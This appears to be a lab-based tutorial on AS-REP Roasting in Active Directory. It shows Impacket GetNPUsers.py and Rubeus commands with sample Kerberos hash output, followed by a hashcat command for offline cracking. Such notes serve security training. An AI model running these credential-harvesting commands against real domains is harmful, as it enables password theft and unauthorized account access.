**AS-REP Roasting**

Is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "**Do not require Kerberos pre-authentication"**. This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!

![81bf1dad6425f8f06b0026f4e748f193](https://github.com/user-attachments/assets/2ccdf90a-420f-45dd-8c55-8f1142276804)


**First method**


We should do some recon to obtain the AD users and collect them in a file ```users.txt```:
```
Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$
```
 ```
GetNPUsers.py -dc-ip <DomainController_IP> <domain>/<user> -usersfile <path_to_users_file>
```
**ex**
```
GetNPUsers.py -dc-ip 10.10.73.127 thm.red/thm -usersfile users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$victim@THM.RED:269af6bae34fa24f66669f64454eb290$95c86c6aad2085a6f0263c92587a1bee24d04e13e74e5c510d7b17287ce772553f28f5fe1306cda7ba06db1c0fede4c09c8e3e8fec0bebfd85c47ded661f54c686216c296ae99d6b389eaa7bbb1b12b85347fee45574d39a4ca2e5f157bb732472d4614787e4204ac82adcee530d4a6a9ab2da7775d06922f8650468826c329bbf4e86c9f6be04d5ff54790a098a09bbc2500659c834c96e4a90ba6e042855eaa1672645f8620abea4f7fb43322624c6950b990fc247f08be8a098adf9920e22c5f7310fe7b710def9b071472c2440629bedc226dc6fadff2e20727bc467e543f6c8
[-] User CREDS-HARVESTIN$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```


The ```GetNPUsers.py``` is used to request Kerberos **TGTs** for user accounts that have the **"Do not require Kerberos preauthentication"**

<br>

**Second method**

```
Rubeus.exe asreproast /nowrap
```
the output will look like this:
```
[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::b5c8:9b6f:25dc:5bf6%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:AF01B8AF2BA0C81C0D438ACB15A2B476$F766A68EF45E9C5924B096B5B4B0916366763EA31A6301E8DD511ACA336D7E162F29D6703BE0489410EBAB6E2A94EC416F1CA0DBA2B71A42C35BB0D1113E07B81D5D8662BF8CE1BAD89B9B408AFFDD531F0C401101937F1C5E2526E44194BF8CDC1ACB18623D52B19E30AA1D14C15E97FB6B329B92726AC394E0373C090B4C32C1D1CEBA3014BF5B0126F3C014BD1CDED856EC99C26F5566C66488C355BA49E572D445C88C583CCBF7686514297ABCB546FA2C18D15CAC4459235D798A3950C88C3369ABF2991AAF5EAB9D2C03792108F328EC65358427D86E5C595E7F5CB61828EABA0A99FA33F0241C51607BB14F1F415EA655
```
**Cracking the AS-REP Hash:**

To crack the AS-REP hash, you can use Hashcat with the following command:
```
hashcat -m 18200 hash.txt /path/to/rockyou.txt
```





























